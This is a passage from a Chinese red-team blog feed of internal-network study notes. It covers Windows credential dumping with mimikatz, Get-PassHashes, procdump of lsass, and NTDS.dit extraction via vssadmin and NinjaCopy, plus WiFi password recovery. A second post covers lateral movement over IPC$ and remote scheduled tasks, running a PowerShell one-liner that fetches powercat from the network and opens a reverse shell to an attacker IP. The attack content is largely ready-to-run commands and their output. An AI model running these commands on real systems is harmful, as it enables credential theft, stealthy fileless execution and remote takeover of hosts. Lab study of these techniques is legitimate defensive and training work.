脚本，Get-PassHashes 下载地址：<a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p><p>导入 ps1 脚本，以管理员权限执行 Get-PassHashes 即可。</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-PassHashes.ps1Get-PassHashes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者绕过无法执行 PS 脚本的限制，直接无文件执行（推荐），同样需要管理员权限。</p><pre class="line-numbers language-none"><code class="language-none"># 不使用代理powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;master&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes&quot;# 使用代理，如果目标无法访问 github 可以使用下面的命令利用代理访问powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;master&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804174013.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="5、mimikatz"><a href="#5、mimikatz" class="headerlink" title="5、mimikatz"></a>5、mimikatz</h2><p>说到密码抓取，又怎能少得了 mimikatz 呢。</p><p>mimikatz 是法国技术大神 Benjamin Delpy 使用 C 语言写的一款轻量级系统调试工具，该工具可以从内存中提取明文密码、散列值、PIN 和 K8S 票据，还可以执行哈希传递、票据传递、构建黄金票据等。</p><p>mimikatz 项目 releases 地址：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p>使用 mimikatz 读取本地 SAM 文件，获取 NTLM Hash</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804175741.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>或者使用 mimikatz 直接查看明文密码</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804175941.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>另外也可以采用 PowerShell 远程加载 mimikatz，相较于直接拷贝 mimikatz.exe 到目标主机，这种方式隐藏性要更好些。</p><pre class="line-numbers language-none"><code class="language-none"># 不使用代理powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;# 使用代理，如果目标无法访问 github 可以使用下面的命令利用代理访问powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811125132.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="6、SAM、SYSTEM、SECURITY-文件"><a href="#6、SAM、SYSTEM、SECURITY-文件" class="headerlink" title="6、SAM、SYSTEM、SECURITY 文件"></a>6、SAM、SYSTEM、SECURITY 文件</h2><h3 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h3><p>直接注册表导出 SAM、SYSTEM、SECURITY 文件</p><pre class="line-numbers language-none"><code class="language-none">reg save HKLM\SAM sam.hivreg save HKLM\SYSTEM system.hivreg save HKLM\SECURITY security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者使用 ninjacopy 脚本，下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination &quot;c:\sam.hiv&quot;Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination &quot;c:\system.hiv&quot;Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SECURITY&quot; -LocalDestination &quot;c:\security.hiv&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果条件允许也可以使用 U 盘启动盘直接拷贝以下文件</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\config\SAMC:\Windows\System32\config\SYSTEMC:\Windows\System32\config\SECURITY<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>除此之外，使用一些漏洞也可以获取到 SAM、SYSTEM、SECURITY 文件，比如 CVE-2021-36934，具体可参考 <a href="https://teamssix.com/210725-074847.html">https://teamssix.com/210725-074847.html</a></p><h3 id="获取-HASH"><a href="#获取-HASH" class="headerlink" title="获取 HASH"></a>获取 HASH</h3><p>用 mimikatz 获取</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exelsadump::sam &#x2F;sam:sam.hiv &#x2F;system:system.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812181245.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>用 cain 获取，找到 Cracker 里的 LM &amp; NTLM Hash，点击加号，选择从 SAM 导入，选择 SAM 文件后，查看 SYSTEM 文件的 HEX，复制到 Boot Key 里，点击下一步即可查看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811162549.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>cain 还可以直接查看明文密码，在 Decoders 里找到 LSA Secrets，导入 system.hiv 和 security.hiv 就可以看到明文的密码了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811163002.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>用 SAMInside 读取，直接在 File 菜单中选择导入 SAM 和 SYSTEM 文件即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811161122.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="7、lsass-dmp-文件"><a href="#7、lsass-dmp-文件" class="headerlink" title="7、lsass.dmp 文件"></a>7、lsass.dmp 文件</h2><h3 id="导出文件-1"><a href="#导出文件-1" class="headerlink" title="导出文件"></a>导出文件</h3><p>任务管理器导出 lsass.dmp 文件，在任务管理器中找到 lsass.exe 右击选择创建转储文件即可。</p><p>或者使用 Procdump 导出 lsass.dmp 文件，Procdump 是微软官方发布的工具，因此基本不会被杀软拦截，下载地址：<a href="https://download.sysinternals.com/files/Procdump.zip">https://download.sysinternals.com/files/Procdump.zip</a></p><pre class="line-numbers language-none"><code class="language-none">procdump -accepteula -ma lsass.exe lsass.DMP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="获取-HASH-1"><a href="#获取-HASH-1" class="headerlink" title="获取 HASH"></a>获取 HASH</h3><p>使用 mimikatz 可获取 lsass.dmp 文件里的 hash 以及明文密码值</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exesekurlsa::minidump lsass.DMPsekurlsa::logonPasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811172353.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="8、ntds-dit-文件"><a href="#8、ntds-dit-文件" class="headerlink" title="8、ntds.dit 文件"></a>8、ntds.dit 文件</h2><p>在域中的所有账号密码被存放在了 ntds.dit 文件中，如果获取到该文件就相当于拿到整个域权限，不过该文件只在域控中。</p><p>ntds.dit 文件位置:</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\NTDS\NTDS.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="导出-ntds-dit"><a href="#导出-ntds-dit" class="headerlink" title="导出 ntds.dit"></a>导出 ntds.dit</h3><p>Ntdsutil 导出 ntds.dit 和 system 文件，并放在 C 盘目录下</p><pre class="line-numbers language-none"><code class="language-none">Ntdsutil &quot;activate instance ntds&quot; Ifm &quot;create full C:\ntdsutil&quot; Quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812181529.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>vssadmin 导出 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit# SAM 等文件也可以使用 vssadmin 导出copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>NinjaCopy 脚本也可以，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p><pre class="line-numbers language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="获取-HASH-2"><a href="#获取-HASH-2" class="headerlink" title="获取 HASH"></a>获取 HASH</h3><p>NTDSDumpEx 查看 ntds.dit，下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p><pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system.hiv -o domain.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811174802.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>或者使用 impacket 里的 secretsdump.py 脚本查看 ntds.dit 内容，下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><pre class="line-numbers language-none"><code class="language-none">python3 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811175616.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>除了拷贝 ntds.dit 到本地外，mimikatz 也可以直接查看本机的域用户所有的账号密码，不过相对于拷贝 ntds.dit 到自己的机器上来说，直接使用 mimikatz 隐蔽性肯定就会差些了。</p><p>直接获取 teamssix 域内所有用户 </p><pre class="line-numbers language-none"><code class="language-none">hashlsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取单个用户的详细信息</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="9、WIFI-密码"><a href="#9、WIFI-密码" class="headerlink" title="9、WIFI 密码"></a>9、WIFI 密码</h2><p>使用自带命令可直接查询</p><p>获取登录过的 WIFI 名称</p><pre class="line-numbers language-none"><code class="language-none">netsh wlan show profiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取某个连接过的 WIFI 密码</p><pre class="line-numbers language-none"><code class="language-none">netsh wlan show profile name&#x3D;&quot;teamssix&quot; key&#x3D;clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取所有连接过的 WIFI 密码</p><pre class="line-numbers language-none"><code class="language-none">for &#x2F;f  &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key&#x3D;clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812091842.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://forum.butian.net/share/259">https://forum.butian.net/share/259</a></p><p><a href="https://zhuanlan.zhihu.com/p/220277028">https://zhuanlan.zhihu.com/p/220277028</a></p><p><a href="https://y4er.com/post/ntlm-hash-and-lm-hash/">https://y4er.com/post/ntlm-hash-and-lm-hash/</a></p><p><a href="https://blog.csdn.net/qq_41874930/article/details/108141331">https://blog.csdn.net/qq_41874930/article/details/108141331</a></p><p><a href="https://blog.csdn.net/qq_41874930/article/details/108149449">https://blog.csdn.net/qq_41874930/article/details/108149449</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;Windows 系统一般使用两种方法对用户的密码进行加密处理，在域环境中，用户的密码信息以哈希值的密文形式存储在 ntds.</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】19、IPC 与计划任务</title>
    <link href="https://www.teamssix.com/210802-181052.html"/>
    <id>https://www.teamssix.com/210802-181052.html</id>
    <published>2021-08-02T10:10:52.000Z</published>
    <updated>2021-08-04T08:22:03.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点。</p><h2 id="1、IPC"><a href="#1、IPC" class="headerlink" title="1、IPC"></a>1、IPC</h2><p>IPC (Internet Process Connection) 是为了实现进程间通信而开放的命名管道，当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限。</p><p>建立 IPC 连接：</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入 net use 可以查看当前建立的连接</p><pre class="line-numbers language-none"><code class="language-none">C:\&gt;net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator命令成功完成。C:\&gt;net use会记录新的网络连接。状态       本地        远程                      网络-------------------------------------------------------------------------------OK                     \\192.168.7.107\ipc$      Microsoft Windows Network命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>映射磁盘到本地</p><pre class="line-numbers language-none"><code class="language-none">net use t: \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想删除映射的磁盘</p><pre class="line-numbers language-none"><code class="language-none">net use t: &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>dir 列出对方目录</p><pre class="line-numbers language-none"><code class="language-none">dir \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;dir \\192.168.7.107\c$ 驱动器 \\192.168.7.107\c$ 中的卷没有标签。 卷的序列号是 BC2F-8F01 \\192.168.7.107\c$ 的目录2020&#x2F;11&#x2F;24  17:28    &lt;DIR&gt;          Program Files2020&#x2F;11&#x2F;24  17:26    &lt;DIR&gt;          Program Files (x86)2021&#x2F;02&#x2F;13  17:49    &lt;DIR&gt;          TEMP2021&#x2F;08&#x2F;02  11:42    &lt;DIR&gt;          Users2020&#x2F;11&#x2F;25  08:37    &lt;DIR&gt;          Windows               0 个文件              0 字节              5 个目录 32,833,009,664 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tasklist 查看进程</p><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX映像名称                       PID 会话名              会话#       内存使用&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;System Idle Process              0                            0         24 KSystem                           4                            0        368 Ksmss.exe                       260                            0        628 Kcsrss.exe                      356                            0      2,360 Kwininit.exe                    408                            0        264 Kcsrss.exe                      420                            1      8,692 Kwinlogon.exe                   468                            1      2,012 Kservices.exe                   512                            0      7,460 Klsass.exe                      520                            0     10,216 Klsm.exe                        528                            0      4,148 Kspoolsv.exe                   1356                            0      6,504 Ksvchost.exe                   1392                            0      7,028 K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 \del 可断开连接</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h2><p>Windows 可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在 Windows Server 2008 及之后的系统中，已经被废弃了。</p><p>这里看看在建立 IPC 连接后，使用计划任务运行可执行文件，主要步骤如下：</p><p>1、查看目标主机时间</p><p>2、上传可执行文件到目标主机</p><p>3、设置计划任务执行可执行文件</p><p>4、删除计划任务</p><p>首先查看下目标主机时间</p><pre class="line-numbers language-none"><code class="language-none">net time \\192.168.7.107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;net time \\192.168.7.107\\192.168.7.107 的当前时间是 2021&#x2F;8&#x2F;2 14:28:01命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>创建一个反弹木马 bat 程序，这里使用 PowerShell 进行反弹，bat 文件内容如下：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.7.4 -p 4444 -e cmd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在攻击机上开启 nc 监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 bat 程序上传到目标主机</p><pre class="line-numbers language-none"><code class="language-none">copy evil.bat \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 at 创建计划任务</p><pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 14:30 C:\evil.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想清除 ID 为 1 的计划任务</p><pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 1 &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 schtasks 创建计划任务</p><pre class="line-numbers language-none"><code class="language-none"># 开机以 system 权限执行 C:\evil.batschtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;sc onstart &#x2F;tr C:\evil.bat &#x2F;ru system &#x2F;f# 在 2021&#x2F;08&#x2F;03 前的每一天的 14:30:00 执行 C:\evil.batschtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;tr C:\evil.bat &#x2F;sc daily &#x2F;st 14:30:00 &#x2F;ed 2021&#x2F;08&#x2F;03# 立刻运行名称为 evil 的任务schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想清除名称为 evil 的计划任务</p><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;delete &#x2F;s 192.168.7.107 &#x2F;tn &quot;evil&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在建立 IPC 连接后，除了使用计划任务进行间接的反弹 Shell，还可以通过 PsExec 直接反弹 Shell</p><p>PsExec 下载地址：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><pre class="line-numbers language-none"><code class="language-none">Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210802180916.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：<br><a href="https://www.freebuf.com/articles/web/251389.html">https://www.freebuf.com/articles/web/251389.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点。&lt;/p&gt;</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】18、LLMNR 和 NetBIOS 欺骗攻击</title>
    <link href="https://www.teamssix.com/210729-191048.html"/>
    <id>https://www.teamssix.com/210729-191048.html</id>
    <published>2021-07-29T11:10:48.000Z</published>
    <updated>2021-08-04T08:22:03.535Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>如果已经进入目标网络，但是没有获得凭证，可以使用 LLMNR 和 NetBIOS 欺骗攻击对目标进行无凭证条件下的权限获取。</p><h2 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h2><h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h3><p>本地链路多播名称解析（LLMNR）是一种域名系统数据包格式，当局域网中的 DNS 服务器不可用时，DNS 客户端就会使用 LLMNR 解析本地网段中机器的名称，直到 DNS 服务器恢复正常为止。</p><p>从 Windows Vista 开始支持 LLMNR ，Linux 系统也通过 systemd 实现了此协议，同时 LLMNR 也支持 IPv6。</p><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><p>NetBIOS 协议是由 IBM 公司开发，主要用于数十台计算机的小型局域网，根据 NetBIOS 协议广播获得计算机名称，并将其解析成相应的 IP 地址。</p><p>从 Windows NT 以后版本的所有操作系统中都可以使用 NetBIOS，不过 NetBIOS 不支持 IPv6.</p><p>NetBIOS 提供的三种服务：</p><p>​    i、NetBIOS-NS（名称服务）：主要用于名称注册和解析，以启动会话和分发数据报，该服务默认监听 UDP 137 端口，也可以使用 TCP 的 137 端口进行监听。</p><p>​    ii、Datagram Distribution Service（数据报分发服务）：无连接服务，该服务负责进行错误检测和恢复，默认监听 UDP 138 端口。</p><p>​    iii、Session Service（会话服务）：允许两台计算机建立连接，默认使用 TCP 139 端口。</p><h3 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h3><blockquote><p>NTLM 